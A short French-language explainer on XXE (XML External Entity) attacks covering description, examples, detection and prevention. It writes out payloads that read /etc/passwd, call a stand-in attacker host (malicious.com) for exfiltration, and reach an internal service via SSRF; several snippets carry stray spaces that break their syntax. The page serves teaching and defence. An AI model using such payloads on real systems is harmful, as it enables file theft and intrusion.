# XXE (External XML Entity)

## Description
Une attaque XXE (XML External Entity) survient lorsqu'un analyseur XML mal configuré permet d'inclure des entités externes dans des documents XML. Cela peut conduire à des fuites de fichiers, des exfiltrations de données sensibles, voire l'exécution de commandes malveillantes.

## Exemples d'attaque XXE
1. **Lecture de fichier** :  
   En intégrant une entité externe pour lire `/etc/passwd`, un attaquant pourrait injecter la charge suivante dans un document XML :  
   `<! DOCTYPE foo [<! ENTITY xxe SYSTEM "file:///etc/passwd">]>`  
   Puis inclure cette entité dans une balise du XML :  
   `<foo>& xxe;</foo>`

2. **Exfiltration de données** :  
   Une entité externe peut être configurée pour envoyer des données vers un serveur externe :  
   `<! ENTITY xxe SYSTEM "http://malicious.com/evil">`  
   Ensuite, l’injection de `& xxe;` dans une requête XML transmettra les données.

3. **Attaque SSRF via XXE** :  
   Les entités XML peuvent également être utilisées pour forcer le serveur à faire des requêtes vers des ressources internes :  
   `<! ENTITY xxe SYSTEM "http://127.0.0.1:8080/internal-service">`

## Techniques de détection
1. **Payloads courants** : Utilisez des entités externes et validez si la réponse inclut les données du serveur.
2. **Fuzzing** : Injectez des entités XML pour tester la réaction de l'application et détecter les réponses avec fuite d’information.

## Conseils de prévention
1. Désactivez la résolution des entités externes dans les analyseurs XML.
2. Utilisez des bibliothèques XML sécurisées et suivez les recommandations de sécurité.

